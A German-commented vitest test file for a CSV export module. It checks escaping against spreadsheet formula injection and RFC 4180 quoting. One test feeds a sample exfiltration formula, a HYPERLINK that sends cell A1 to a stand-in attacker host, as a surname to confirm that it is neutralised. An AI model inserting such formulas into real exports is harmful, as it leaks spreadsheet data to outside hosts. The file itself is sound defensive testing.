import { describe, expect, it } from 'vitest';
import { buildCsv, escapeCsvValue } from '@/server/export/csv';

/**
 * CSV-Export.
 *
 * Der wichtigste Test hier betrifft CSV-Injection: Ein Besteller darf ueber seinen Namen
 * keine Formel in die Tabelle des Admins bekommen.
 */

describe('escapeCsvValue – Schutz vor Formel-Injection', () => {
  it('entschaerft Werte, die mit = beginnen', () => {
    expect(escapeCsvValue('=1+1')).toBe("'=1+1");
  });

  it('entschaerft die uebrigen gefaehrlichen Anfangszeichen', () => {
    expect(escapeCsvValue('+49 170')).toBe("'+49 170");
    expect(escapeCsvValue('-5')).toBe("'-5");
    expect(escapeCsvValue('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('entschaerft auch einen echten Angriffsversuch als Nachname', () => {
    const value = escapeCsvValue('=HYPERLINK("http://boese.example/?x="&A1,"Klick")');

    // Der Wert enthaelt Anfuehrungszeichen, wird also zusaetzlich als Feld eingepackt.
    // Entscheidend ist, dass der Zellinhalt mit dem Apostroph beginnt und Excel ihn
    // dadurch als Text und nicht als Formel liest.
    expect(value.startsWith('"\'=')).toBe(true);
    expect(value.endsWith('"')).toBe(true);
  });

  it('laesst harmlose Werte unveraendert', () => {
    expect(escapeCsvValue('Mustermann')).toBe('Mustermann');
    expect(escapeCsvValue(42)).toBe('42');
  });
});

describe('escapeCsvValue – RFC 4180', () => {
  it('verdoppelt Anfuehrungszeichen und packt das Feld ein', () => {
    expect(escapeCsvValue('Er sagte "hallo"')).toBe('"Er sagte ""hallo"""');
  });

  it('packt Felder mit Semikolon ein', () => {
    expect(escapeCsvValue('Mustermann; Max')).toBe('"Mustermann; Max"');
  });

  it('packt Felder mit Zeilenumbruch ein', () => {
    expect(escapeCsvValue('Zeile1\nZeile2')).toBe('"Zeile1\nZeile2"');
  });

  it('macht aus null und undefined ein leeres Feld', () => {
    expect(escapeCsvValue(null)).toBe('');
    expect(escapeCsvValue(undefined)).toBe('');
  });
});

describe('buildCsv', () => {
  const columns = [
    { header: 'Name', value: (row: { name: string; menge: number }) => row.name },
    { header: 'Menge', value: (row: { name: string; menge: number }) => row.menge },
  ];

  it('schreibt Kopfzeile und Datenzeilen mit Semikolon', () => {
    const csv = buildCsv([{ name: 'Abipulli', menge: 47 }], columns);
    const lines = csv.replace('﻿', '').trim().split('\r\n');

    expect(lines[0]).toBe('Name;Menge');
    expect(lines[1]).toBe('Abipulli;47');
  });

  it('beginnt mit einem BOM, damit Excel UTF-8 erkennt', () => {
    const csv = buildCsv([{ name: 'Größe', menge: 1 }], columns);
    expect(csv.startsWith('﻿')).toBe(true);
    expect(csv).toContain('Größe');
  });

  it('schreibt auch ohne Datenzeilen eine Kopfzeile', () => {
    const csv = buildCsv([], columns);
    expect(csv.replace('﻿', '').trim()).toBe('Name;Menge');
  });
});
